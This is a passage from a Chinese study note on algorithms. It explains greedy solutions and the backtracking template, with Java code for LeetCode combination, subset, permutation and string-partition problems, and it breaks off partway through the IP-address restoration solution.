i);\t\t//到达当前一步的最大覆盖范围\t\tif (i == curDistance) &#123;\t\t\tresult++;\t\t\tcurDistance = nextDistance;\t\t\tif (curDistance &gt;= nums.length - 1) &#123;\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t&#125;\treturn result;&#125;\n\n加油站用法示例（力扣134. 加油站：在一条环形公路上选择一个起始加油站，从这个加油站出发，可以完成环行任务，即从每一个加油站占点都能到达下一个加油站，中途不能断油，如果没有这样一个起始加油站满足环行要求，则返回-1）：\n要存在这样的加油站，需要满足，所有加油站的总油量大于等于路程总消耗，所以需要有一个变量计算总油量减总消耗的值。局部最优解法中满足环行要求的加油站的前一个加油站的特点是，到下一站的油量减消耗的累加和为负数（gas[i]-cost[i]的累加和为负数）。全局最优解是按照局部最优解法找到的加油站作为起始可以环行一周。\npublic int canCompleteCircuit(int[] gas, int[] cost) &#123;\t//用于计算所有加油站的总油量是否大于等于路程总消耗\tint totalSum = 0;\tint curSum = 0;\tint startIndex = 0;\tfor (int i = 0; i &lt; gas.length; i++) &#123;\t\tint sub = gas[i] - cost[i];\t\tcurSum += sub;\t\ttotalSum += sub;\t\t//找到了满足要求的加油站的前一个加油站\t\tif (curSum &lt; 0) &#123;\t\t\tstartIndex = i + 1;\t\t\tcurSum = 0;\t\t&#125;\t&#125;    //如果totalSum大于等于0，说明就算过程中出现curSum小于0，也可以在其它加油站得到油量补充，抵消curSum小于0的情况\treturn totalSum &lt; 0 ? -1 : startIndex;&#125;\n\n\n\n回溯法回溯法也称回溯搜索法，是一种搜索方式。递归法的递归过程中就有回溯的过程。回溯法解决的问题都可以抽象为树形结构，因为回溯法解决的问题都是在集合中递归查找子集。集合的大小就构成了树的宽度，递归的深度构成了树的深度。\n回溯法的本质是穷举（暴力解法），并不高效，当然也可以增加一些剪枝操作，提高效率。之所以不高效还使用，原因是部分问题只能通过穷举再加剪枝解决，没有更高效的解法。\n这些只能通过穷举解决的问题包括：\n\n组合问题：在n个数中找出所有符合规则的k个数的组合。\n子集问题（组合问题的问法变种，跟组合问题的解法是一样的，只是没有了任何长度和总和的限制，所有组合都能往结果集里面添加）：在n个数中找出所有符合条件的子集。\n子序列问题：：在n个数中找出所有符合条件的子序列，子序列和子集的不同是，子集是无序的，子序列是有序的。\n排列问题：在n个数中找出所有符合条件的排列方式。\n分割问题：在一个字符串中找出所有符合规则的分割方式。\n棋盘问题：N皇后，数独问题。\n\n组合是不强调元素顺序的，而排列强调元素顺序。\n回溯法“三部曲”（回溯法模板）：\n\n确定回溯函数的返回值和参数。\n回溯函数的函数返回值一般是void。\n因为回溯函数的参数不容易一次性确定下来，所以一般是先写逻辑，然后需要什么参数就增加什么参数。\n\n确定回溯函数的终止条件。\n由于回溯法解决的问题都可以抽象为树形结构，所以一种情况是，搜索到叶子节点也就找是到了满足条件的一个答案，此时应把答案存入结果集，并结束本层递归。\n\n确定回溯搜索的遍历过程。\n输入的集合的大小构成了树的宽度，递归的深度构成了树的深度。\n为提高效率还需要对遍历范围进行剪枝。\n\n\n可以看到回溯法的模板和递归法是极其相似的，不同的主要是回溯法的处理逻辑只有遍历，而递归的处理逻辑多种多样。\n限定长度的组合（组合问题）用法示例（力扣77. 组合：返回[1, n]范围内的所有长度为k的组合）：\n如果使用暴力解法，那么for循环的层数和k一样，k可能很大，导致循环嵌套层数过多，而回溯法使用递归解决了循环嵌套层数过多的问题。\n要对回溯法解法进行分析，可以将问题抽象为树形结构（N叉树），以便于理解。对于每个节点的子节点，从左往右，可以选择的元素的个数依次递减（因为左侧的元素已经在左边的兄弟节点遍历过了，只需要继续遍历右侧的元素）。\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n需要一个变量存放查找结果（设为result），需要一个变量存放已经遍历的部分（设为path），需要两个参数传递输入的n，k，另外还需要一个参数存放遍历的起始下标（设为startIndex），可以理解为N叉树中当前节点在其所有兄弟节点中的位置下标。\n返回值是void。\n\n确定回溯函数的终止条件。\n如果path的长度大小等于k，说明找到了一个长度为k的组合。此时使用将path存入result，并结束当前的递归分支。\n\n确定回溯搜索的遍历过程。\n遍历从startIndex开始，先使用path保存遍历的节点，执行完新的回溯分支后，删除path在进入回溯分支前保存的节点（回溯）。回溯的目的是保证path中不会添加兄弟节点，因为兄弟节点已经在新的回溯分支中遍历过了，如果不删除，会出现三个问题：\n\n添加到result内的组合重复\n兄弟节点已经在新的回溯分支中遍历过了，如果不删除，后续的组合会出现和之前元素一样的组合，如果这种组合恰好满足条件，就会被重复添加到result中。\n\n部分组合不能搜索到\n首先对于包含左侧元素的组合就不能搜索到，因为如果不删除，左侧的元素一定会保留在path中。\n\nN叉树不能正确分支\n因为遍历中的每次取值都是一个分支，如果不删除，则进入分支时不能保证只有一个节点。\n\n\n这道题还可以对遍历进行剪枝，分析得到能够剪枝的情况是，如果剩余的元素个数（n-i）小于还需要的元素个数（k-path的长度），就没必要继续遍历了。\n\n\npublic List&lt;List&lt;Integer&gt;&gt; combine(int n, int k) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tbacktrace(result, new ArrayList&lt;&gt;(k), n, k, 0);\treturn result;&#125;public void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int n, int k, int startIndex) &#123;\tif (path.size() == k) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;\tfor (int i = startIndex; (n - i) &gt;= (k - path.size()); i++) &#123;\t\tpath.add(i + 1);\t\tbacktrace(result, path, n, k, i + 1);\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n限定长度、总和的组合（组合问题）用法示例（力扣216. 组合总和 III：返回[1, 9]范围内的所有和为目标和，元素个数为k的组合，要求每种组合中不存在重复的数字）：\n要对回溯法解法进行分析，可以将问题抽象为树形结构（N叉树），本题中，集合的长度相当于树的宽度，元素个数k相当于树的深度。\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n需要一个变量存放查找结果（设为result），需要一个变量存放已经遍历的部分（设为path），需要一个变量存放已经遍历的元素的总和（设为sum），需要两个参数传递输入的目标和（设为targetSum），目标长度（设为k），另外还需要一个参数存放遍历的起始下标（设为startIndex），可以理解为N叉树中当前节点在其所有兄弟节点中的位置下标。\n可以看到和上一题找出长度为k的所有组合相比，除了多了两个参数sum和targetSum，长度从变量改为确定之9，之外，其它的参数都一样，sum是中间结果的存储类型发生了变化，targetSum是增加了一个对结果总和的限制条件。这里的sum和targetSum也可以去掉一个，每次遍历时让targetSum减去当前的遍历到的参数。\n返回值是void。\n\n确定回溯函数的终止条件。\n这道题的终止条件有两种情况：\n\n一种是满足条件要求，这种情况下，总和为targetSum，元素个数为k。\n另一种是不满足条件，一种情况是，targetSum减去总和小于0，因为[1, 9]范围内一定都是正数且逐渐增大，如果之前数值小的元素使得总和大于targetSum，那么后续一定只会比targetSum更大；还有一种情况是元素个数已经是k，但是总和不等于targetSum。\n\n\n确定回溯搜索的遍历过程。\n这道题和上一题的遍历过程的主要的不同之处是，不是记录遍历过的节点，而是记录减去遍历节点的值。剪枝的思路还是一样的，也是根据了剩余长度是否足够后续的元素数量需要。\n\n\npublic List&lt;List&lt;Integer&gt;&gt; combinationSum3(int k, int n) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();    //这里对下标的处理和前一道稍有不同，是从1开始的，之所以这样做，是因为如果这道题不是从1开始，那么后续的加1操作太多（比如sum -= i + 1; sum -= i + 1;），出于效率的考虑使用从1开始这种形式。从0开始还是从1开始都可以，后续的处理逻辑和起始下标适配即可\tbacktrace(result, new ArrayList&lt;&gt;(9), n, k, 1);\treturn result;&#125;//1、回溯函数的返回值和参数public void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int sum, int k, int startIndex) &#123;    //回溯函数的终止条件\tif (sum &lt; 0 || (sum == 0 &amp;&amp; path.size() != k)) &#123;\t\treturn;\t&#125;\tif (sum == 0 &amp;&amp; path.size() == k) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;    //回溯搜索的遍历过程\tfor (int i = startIndex; (9 - i + 1) &gt;= (k - path.size()); i++) &#123;\t\tpath.add(i);       \t//这段代码有简写的形式，此数为表示得更清晰，保留原始的写法\t\tsum -= i;\t\tbacktrace(result, path, sum, k, i + 1);\t\tsum += i;        //也可以简写为        //backtrace(result, path, sum - i, k, i + 1);\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n限定总和的组合（组合问题）用法示例（力扣39. 组合总和：返回在给定集合中，所有元素的和为目标和的不同（不能重复）组合，给定集合中不存在重复元素，且给定集合中的元素可以被重复使用，给定集合中的元素一定大于0）：\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n需要一个变量存放查找结果（设为result），需要一个变量存放已经遍历的部分（设为path），需要一个变量存放已经遍历的元素的总和（设为sum），需要两个参数传递输入的目标和（设为targetSum）和给定集合（设为candidates），另外还需要一个参数存放遍历的起始下标（设为startIndex），对于组合问题判断是否需要使用startIndex的规则是，如果是在一个集合中求元素组合，那么就需要使用startIndex；如果是在多个集合中求元素的组合，各个集合直接互相不影响，那么就不需要使用startIndex。\n和上一题一样，这里的sum和targetSum也可以去掉一个，每次遍历时让targetSum减去当前的遍历到的参数。\n返回值是void。\n\n确定回溯函数的终止条件。\n这道题没有限制组合的长度，所以只要选取的元素总和等于或超过targetSum就返回。等于targetSum时说明找到了一种满足条件的组合，需要先添加到结果集再返回；超过targetSum时，因为所有元素都大于0，说明后续也不再可能出现和为targetSum的组合，直接返回，结束当前的迭代。\n\n确定回溯搜索的遍历过程。\n这道题在遍历过程中的特点是，元素可以重复选取。对于这种情况，处理逻辑是在进入下一层回溯函数迭代时，不对索引加1，从而使得下一层回溯函数可以重复使用当前元素。\n这道题的剪枝操作就是在出现选取的元素总和超过targetSum这种情况后终止当前迭代。既可以像第二步一样放在终止条件部分，也可以放在回溯搜索的遍历过程，从而前置剪枝操作，以提高效率。\n\n\n//不使用排序的解法public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tbacktrace(result, new LinkedList&lt;&gt;(), candidates, target, 0);\treturn result;&#125;public void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] candidates, int targetSum, int startIndex) &#123;\tif (targetSum == 0) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;\tfor (int i = startIndex; i &lt; candidates.length; i++) &#123;\t\t//如果不排序，则需要放到循环内判断，而不是放在循环条件中判断，因为如果不经排序就放到循环条件中，那么一旦发现不满足就会退出循环，而不是继续寻找后续的元素\t\t//之所以排序（由小到大排）之后就可以放到循环条件中判断，是因为排序之后后续出现的元素一定比当前元素大，如果减去当前元素都小于0，那么减去后续元素只会比0更小\t\tif (targetSum - candidates[i] &lt; 0) &#123;\t\t\tcontinue;\t\t&#125;\t\tpath.add(candidates[i]);\t\ttargetSum -= candidates[i];        //元素可以重复选取，所以在进入下一层回溯函数迭代时，不对起始下标加1\t\tbacktrace(result, path, candidates, targetSum, i);\t\ttargetSum += candidates[i];\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n//使用排序的解法public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\t//排序\tArrays.sort(candidates);\tbacktrace(result, new LinkedList&lt;&gt;(), candidates, target, 0);\treturn result;&#125;public void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] candidates, int targetSum, int startIndex) &#123;\tif (targetSum == 0) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;\t//使用排序后可以将targetSum - candidates[i] &gt;= 0放到判断条件中，在不符合时退出循环，且不会漏掉组合\tfor (int i = startIndex; i &lt; candidates.length &amp;&amp; targetSum - candidates[i] &gt;= 0; i++) &#123;\t\tpath.add(candidates[i]);\t\ttargetSum -= candidates[i];\t\tbacktrace(result, path, candidates, targetSum, i);\t\ttargetSum += candidates[i];\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n限定总和的组合（组合问题，去重）用法示例（力扣40. 组合总和 II：返回在给定集合中，所有元素和为目标和的不同（不能重复）组合，给定集合可能存在重复元素，要求给定集合的每个元素在每个组合中只能使用一次）：\n本题的难点在于，给定集合中有重复元素，但是不能有重复组合。如果依然按照之前的方式处理，不进行特殊操作，就可能产生的一种情况是，两个数值相同的元素被分别添加到两个的组合中，且这两个组合除了值相同的这两个数之外，其它的元素数值也一样，在这种情况下，虽然组合使用到的元素不是同一个，但是两个组合却是重复的。\n要保证结果集中不含有重复组合，一种解决办法是找出所有组合之后，使用set或map去重，但是这样做效率低，所以考虑在搜索的过程中完成对组合的去重。在搜索过程中去重，相当于在同一数层的元素不能重复选取。去重操作在树形结构上分两种维度，一个维度是同一树枝，另一个维度是同一数层。判断是否使用树枝维度去重的依据是，数值相同的元素在一个组合内是否可以重复，如果不能重复，则需要使用树枝维度去重；判断是否使用数层去重的依据是，组合是否可以重复，如果不能重复，则需要使用树层维度去重，如果只要使用的不是同一个元素那么组合就可以重复，则不需要去重。当然前提都是给定集合内有重复元素，如果没有重复元素，就不需要去重了。需要强调的一点是，去重一定要对元素进行排序，这样才能通过相邻的节点来判断元素是否重复使用了。\n因为本题中，数值相同的元素在一个组合内可以重复（出现多次），所以不需要对树枝维度去重；两个组合不能重复，所以需要使用对数层的维度去重。\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n 本题需要在上一题的基础上，增加一个bool类型的数组（设为used），用来记录同一树枝或树层上的元素是否使用过，used[i - 1]为true表示元素在同一树枝使用过，used[i-1]为false表示元素在同一树层使用过。还可以使用startIndex去重，下标大于startIndex表示元素在同一树层使用过，但使用used数组去重具有普适性，也更容易理解。\n返回值是void。\n\n确定回溯函数的终止条件。\n这道题的终止条件和上一题相同。\n\n确定回溯搜索的遍历过程。\n这道题的回溯搜索的遍历过程和上一题主要的区别有两个，一个是不能对元素重复使用，所以进入下一层回溯函数迭代时，需要对索引加1；另一个是多了去重。\n\n\n//使用used数组去重public List&lt;List&lt;Integer&gt;&gt; combinationSum2(int[] candidates, int target) &#123;\tArrays.sort(candidates);\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tbacktrace(result, new LinkedList&lt;&gt;(), candidates, new boolean[candidates.length], target, 0);\treturn result;&#125;public void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] candidates, boolean[] used, int targetSum, int startIndex) &#123;\tif (targetSum == 0) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;\tfor (int i = startIndex; i &lt; candidates.length &amp;&amp; targetSum - candidates[i] &gt;= 0; i++) &#123;\t\t//树层去重        //used[i - 1]为false表示candidates[i]数值相同的元素在同一树层使用过，而不是同一树枝，如果是在同一树枝used[i - 1]为true，则不需要去重\t\tif (i &gt; 0 &amp;&amp; candidates[i] == candidates[i - 1] &amp;&amp; !used[i - 1]) &#123;\t\t\tcontinue;\t\t&#125;\t\tpath.add(candidates[i]);        //use[i]为true表示元素在同一树枝使用过\t\tused[i] = true;\t\ttargetSum -= candidates[i];\t\tbacktrace(result, path, candidates, used, targetSum, i + 1);\t\ttargetSum += candidates[i];        //use[i]为false表示元素在同一树层使用过\t\tused[i] = false;\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n电话号码的字母组合（组合问题）用法示例（力扣17. 电话号码的字母组合：返回一个电话号码字符串（数字取值范围是[2, 9]）能够表示的所有字母组合）：\n[2, 9]范围内的每个电话号码能够表示多个字母（三个或四个），也就是说，电话号码和多个字母存在映射关系（一对多），这个映射关系可以使用一个map或者定义一个二维数组（Java中数组的第二维是可变长的，所以对于这道题长度不定的映射关系，可以使用）来记录。\n这道题属于组合问题。和前面使用回溯法的解法稍有不同的是，这道题不是对电话号码字符串进行回溯，而是对每个电话号码中的每个数字能够表示的字母进行回溯，所以包含了回溯的遍历（下面简称回溯遍历）的起始下标都是从0开始，不再需要使用startIndex参数记录回溯遍历的起始下标。\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n需要一个变量存放查找结果（设为result），需要一个变量存放已经遍历的部分（设为path），需要一个参数传递输入的电话号码（设为digits），需要一个参数传递电话号码和字母的映射关系（设为map），需要一个参数存放当前遍历到的电话号码字符串的电话号码下标（设为index）。\n返回值是void。\n\n确定回溯函数的终止条件。\n终止条件是索引下标等于电话号码字符串的长度，即遍历完了所有电话号码。\n此时将组合存入结果，并结束本层递归。\n\n确定回溯搜索的遍历过程。\n首先要获取当前电话号码的字母映射，然后对当前电话号码映射到的字母进行回溯遍历。\n\n\npublic List&lt;String&gt; letterCombinations(String digits) &#123;\tif (digits == null || digits.length() == 0) &#123;\t\treturn  new LinkedList&lt;&gt;();\t&#125;\t//使用二维数组记录电话号码和字母的映射关系\tchar[][] map = new char[][]&#123;\t\t\tnew char[]&#123;&#125;, //0\t\t\tnew char[]&#123;&#125;, //1\t\t\tnew char[]&#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;, //2\t\t\tnew char[]&#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;,\t\t\tnew char[]&#123;&#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;&#125;,\t\t\tnew char[]&#123;&#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;&#125;,\t\t\tnew char[]&#123;&#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;&#125;,\t\t\tnew char[]&#123;&#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;&#125;,\t\t\tnew char[]&#123;&#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;&#125;,\t\t\tnew char[]&#123;&#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;&#125; //9\t&#125;;\tList&lt;String&gt; result = new LinkedList&lt;&gt;();\tbacktraces(result, new StringBuilder(digits.length()), digits, map, 0);\treturn result;&#125;public void backtraces(List&lt;String&gt; result, StringBuilder path, String digits, char[][] map, int index) &#123;\tif (index == digits.length()) &#123;\t\tresult.add(new String(path));\t\treturn;\t&#125;\tint digit = digits.charAt(index) - &#x27;0&#x27;;\tchar[] letters = map[digit];\tfor (int i = 0; i &lt; letters.length; i++) &#123;\t\tpath.append(letters[i]);\t\tbacktraces(result, path, digits, map, index + 1);\t\tpath.deleteCharAt(path.length() - 1);\t\t//如果path的类型是String，则可以简写为\t\t//backtraces(result, path + letters[i], digits, map, index + 1);\t&#125;&#125;\n\n子集（子集问题）用法示例（力扣78. 子集：给定一个不包含重复元素的数组，返回该数组所有的子集，子集不能重复）：\npublic List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tbacktrace(result, new LinkedList&lt;&gt;(), nums, 0);\treturn result;&#125;private void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] nums, int startIndex) &#123;\t//子集问题是组合问题的问法变种，跟组合问题的解法是一样的，只是没有了任何长度和总和的限制，所有组合都能往结果集里面添加\tresult.add(new ArrayList&lt;&gt;(path));\tfor (int i = startIndex; i &lt; nums.length; i++) &#123;\t\tpath.add(nums[i]);\t\tbacktrace(result, path, nums, i + 1);\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n子集（子集问题，去重）用法示例（力扣90. 子集 II：给定一个包含重复元素的数组，返回该数组所有的子集，子集不能重复）：\n本题依然使用树层去重（选择树层去重的原因见组合问题去重一题）。\npublic List&lt;List&lt;Integer&gt;&gt; subsetsWithDup(int[] nums) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\t//去重操作需要对输入集合进行排序\tArrays.sort(nums);\tbacktrace(result, new LinkedList&lt;&gt;(), nums, new boolean[nums.length], 0);\treturn result;&#125;private void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] nums, boolean[] used, int startIndex) &#123;\tresult.add(new ArrayList&lt;&gt;(path));\tfor (int i = startIndex; i &lt; nums.length; i++) &#123;\t\t//树层去重，used[i - 1]等于false，说明当前nums[i]和nums[i - 1]是处在同一树层\t\tif (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !used[i - 1]) &#123;\t\t\tcontinue;\t\t&#125;\t\tpath.add(nums[i]);\t\t//同一树枝上的元素是used[i] = true\t\tused[i] = true;\t\tbacktrace(result, path, nums, used, i + 1);\t\t//同一树层上的元素是used[i] = false\t\tused[i] = false;\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n递增子序列（子序列问题，去重）用法示例（力扣491. 递增子序列：给定一个可能包含重复元素的数组，返回该数组中所有的不同的递增子序列，递增子序列至少有两个元素，元素相等也可以看作是递增的）：\n这道题也是需要进行树层去重，但由于这道题是子序列问题，需要保留元素的顺序，不能对数组进行排序，所以不能采用前面提到的组合去重的方法。这道题的去重方法是只对每一树层记录遍历过的元素，也就是说，记录树层元素是否遍历过的集合不再是存在于回溯函数参数里面，而是在每个回溯遍历前创建一个新的。\n可以使用哈希法记录遍历过的参数，适合使用的数据结构有HashSet和数组。这道题中-100 &lt;= nums[i] &lt;= 100，所以更适合使用数组，既能保证空间占用不会太多，只有201个，又能避免进行哈希运算和类型装箱和拆箱，提高执行效率。\npublic List&lt;List&lt;Integer&gt;&gt; findSubsequences(int[] nums) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tbacktrace(result, new LinkedList&lt;&gt;(), nums, 0);\treturn result;&#125;private void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] nums, int startIndex) &#123;\tif (path.size() &gt;= 2) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t&#125;    //记录元素在同一树层是否被使用过\tboolean[] array = new boolean[201];\tfor (int i = startIndex; i &lt; nums.length; i++) &#123;\t\t//树层去重，如果当前元素在同一树层中出现过，就跳过当前元素\t\tif (array[nums[i] + 100]) &#123;\t\t\tcontinue;\t\t&#125;\t\t//不符合递增条件\t\tif (!path.isEmpty() &amp;&amp; nums[i] &lt; path.get(path.size() - 1)) &#123;\t\t\tcontinue;\t\t&#125;        //元素在同一树层被使用\t\tarray[nums[i] + 100] = true;\t\tpath.add(nums[i]);\t\tbacktrace(result, path, nums, i + 1);\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n排列问题（排列问题）用法示例（力扣46. 全排列：给定一个不包含重复元素的数组，返回其所有可能的全排列）：\n排列问题和组合问题的不同之处：\n\n排列问题中，每个树层的回溯循环下标都是从0开始，而不是从startIndex开始。\n因为在之前的全排列中使用过的元素在当前全排列中还会再使用，所以回溯循环下标从0开始。\n\n需要使用used数组记录path中都存放了哪些元素。\n\n\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n需要一个参数记录所有全排列结果（设为result），需要一个参数记录当前正在寻找的排列（设为path），需要一个参数传递输入的数组（设为nums），需要一个used数组变量记录当前树枝中使用过的元素有哪些（设为used）。\n返回值是void。\n\n确定回溯函数的终止条件。\n当正在寻找的排列path的长度等于输入的数组nums的长度，说明当前path是一种全排列，此时将这个全排列加入到结果集，然后退出当前递归。\n\n确定回溯搜索的遍历过程。\n回溯循环下标从0开始，遍历输入的数组nums，再使用used数组判断当前nums[i]是否使用过，如果使用过，就直接跳过，继续遍历下一个元素，如果没有使用过，就对这个元素执行回溯逻辑。\n\n\npublic List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tbacktrace(result, new ArrayList&lt;&gt;(nums.length), nums, new boolean[nums.length]);\treturn result;&#125;private void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] nums, boolean[] used) &#123;\tif (path.size() == nums.length) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;\tfor (int i = 0; i &lt; nums.length; i++) &#123;\t\t//如果当前元素使用过，就直接跳过，继续遍历下一个元素\t\tif (used[i]) &#123;\t\t\tcontinue;\t\t&#125;\t\tpath.add(nums[i]);\t\tused[i] = true;\t\tbacktrace(result, path, nums, used);\t\tused[i] = false;\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n排列问题（排列问题，去重）用法示例（力扣47. 全排列 II：给定一个包含重复元素的数组，返回其所有可能的全排列）：\n排列问题的去重操作和组合的去重一样。也是先对输入的数组排序，然后使用一个used数组，标记当前元素是否是在树枝中还是在树层中。\npublic List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tArrays.sort(nums);\tbacktrace(result, new ArrayList&lt;&gt;(nums.length), nums, new boolean[nums.length]);\treturn result;&#125;public void backtrace(List&lt;List&lt;Integer&gt;&gt; result, List&lt;Integer&gt; path, int[] nums, boolean[] used) &#123;\tif (path.size() == nums.length) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;\tfor (int i = 0; i &lt; nums.length; i++) &#123;\t\t//树层去重，如果同一树层前面已经使用过树值相同的元素，则不再使用\t\tif (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !used[i - 1]) &#123;\t\t\tcontinue;\t\t&#125;\t\t//排列，不能使用已经使用过的元素\t\tif (used[i]) &#123;\t\t\tcontinue;\t\t&#125;\t\tpath.add(nums[i]);\t\tused[i] = true;\t\tbacktrace(result, path, nums, used);\t\tused[i] = false;\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n分割回文串（分割问题）用法示例（力扣131. 分割回文串：将给定的字符串分割出一些子串，使得每个子串都是回文串，返回所有分割方案）：\n本题涉及到两个关键问题：\n\n分割字符串，找出字符串的所有分割方式。\n判断回文，如果分割出的字符串是回文串，则将该字符串添加到结果集。\n\n分割问题也可以抽象为树形结构，树层上是s[i， j]范围内（i固定，j向右逐渐加1）的子串，树枝上是s[j + 1, k]范围内（j+1固定，k向右逐渐加1）的子串。可以理解为，对于树枝来说，树层相当于（分割问题中树层的每个分支是包含1到多个元素的子串，每个子串分出一个树枝，子串的最右端再加1就是子串对应的树枝的开始位置）寻找树枝的开始位置（即j + 1），树枝在上一树层的基础（寻找到的开始位置）上寻找结束位置（即k）。\n分割问题和前面提到的所有回溯问题（组合问题、子集问题、子序列问题、排列问题）的一大不同是，在分割问题的树形结构中，树层的每个分支不再是只有一个元素，而是包含1到多个元素的子串；而组合问题的树形结构中，树层的每个分支只有一个元素。\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n需要一个变量存放查找结果（设为result），需要一个变量存放已经遍历的部分（设为path），另外因为分割过的地方不能重复分割，所以还需要一个参数存放遍历的起始下标（设为startIndex）。\n返回值是void。\n\n确定回溯函数的终止条件。\n当分割到了字符串最后面（startIndex等于字符串的size），说明找到了一种分割方案，将分割方案加入结果集，并终止本层递归。\n\n确定回溯搜索的遍历过程。\n在进入回溯函数迭代之前，需要判断当前子串是不是回文串，如果不是就不进入回溯函数的迭代操作。\n\n\npublic List&lt;List&lt;String&gt;&gt; partition(String s) &#123;\tList&lt;List&lt;String&gt;&gt; result = new LinkedList&lt;&gt;();\tbacktrace(result, new LinkedList&lt;&gt;(), s, 0);\treturn result;&#125;public void backtrace(List&lt;List&lt;String&gt;&gt; result, List&lt;String&gt; path, String s, int startIndex) &#123;\tif (startIndex == s.length()) &#123;\t\tresult.add(new ArrayList&lt;&gt;(path));\t\treturn;\t&#125;\tfor (int i = startIndex; i &lt; s.length(); i++) &#123;        //如果当前子串不是回文串，就继续寻找子串，不进入循环体内的后续操作\t\tif (!isPalindrome(s, startIndex, i)) &#123;\t\t\tcontinue;\t\t&#125;\t\tString subString = s.substring(startIndex, i + 1);\t\tpath.add(subString);\t\t//分割过的地方不能重复分割，所以下标要加1\t\tbacktrace(result, path, s, i + 1);\t\tpath.remove(path.size() - 1);\t&#125;&#125;private boolean isPalindrome(String s, int leftIndex, int rightIndex) &#123;\twhile (leftIndex &lt; rightIndex) &#123;\t\tif (s.charAt(leftIndex) != s.charAt(rightIndex)) &#123;\t\t\treturn false;\t\t&#125;\t\tleftIndex++;\t\trightIndex--;\t&#125;\treturn true;&#125;\n\n分割IP地址（分割问题）用法示例（力扣93. 复原 IP 地址：将一串数字字符串分割成有效的IP地址，返回所有有效的IP地址，有效的IP地址由四个位于0到255之间的整数组成，且不含有前导0）：\n按照回溯法“三部曲”分析如下：\n\n确定回溯函数的返回值和参数。\n这道题的参数在上一题的基础上增加了一个记录点数个数的参数（设为pointNum）。\n返回值是void。\n\n确定回溯函数的终止条件。\n当pointNum等于3，说明分割完毕，验证剩余子串是否有效，此时需要将当前IP添加到结果集中。\n\n确定回溯搜索的遍历过程。\n在进入回溯函数迭代之前，需要判断当前子串是否有效，如果不是就不进入回溯函数的迭代操作。\n\n\npublic List&lt;String&gt; restoreIpAddresses(String s) &#123;\tList&lt;String&gt; result = new LinkedList&lt;&gt;();\tif (s.length() &gt; 12) &#123;\t\treturn result;\t&#125;\tbacktrace(result, s, 0, 0);\treturn result;&#125;public void backtrace(List&lt;String&gt; result, String s, int pointNum, int startIndex) &#123;\tif (pointNum == 3) &#123;\t\tif (isValid(s, startIndex, s.length() - 